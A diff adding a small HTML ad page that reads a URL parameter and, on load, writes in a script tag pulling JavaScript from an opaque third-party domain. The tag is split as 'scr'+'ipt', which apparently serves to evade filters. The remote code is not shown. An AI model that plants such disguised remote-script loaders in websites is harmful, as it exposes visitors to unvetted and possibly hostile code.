@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+    <head>
+	<title>GDT AD</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+    <body>
+	
+<script>
+function getParameter(name, cancelBubble) {
+            var r = new RegExp("(\\?|#|&)" + name + "=([^&#]*)(&|#|$)");
+            var m = location.href.match(r);
+            if ((!m || m == "") && !cancelBubble) m = window.location.href.match(r);
+            return (!m ? "" : m[2]);
+        }
+</script>
+	
+	<script>
+	    window.s_w = getParameter('s_w');
+	</script>
+
+<script type="text/javascript">
+var arr = ['https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js','https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js','https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js','https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js','https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js'];
+var webpath = arr[Math.floor(Math.random()*arr.length)];
+//var webpath = "https://etc.6187wo.com/7a918dae3fe78bff41517bad65101da6.js";
+document.write('<scr'+'ipt src="'+webpath+'" id="'+s_w+'" tag='+s_w+'"></scr'+'ipt>');
+</script>
+    </body>
+</html>
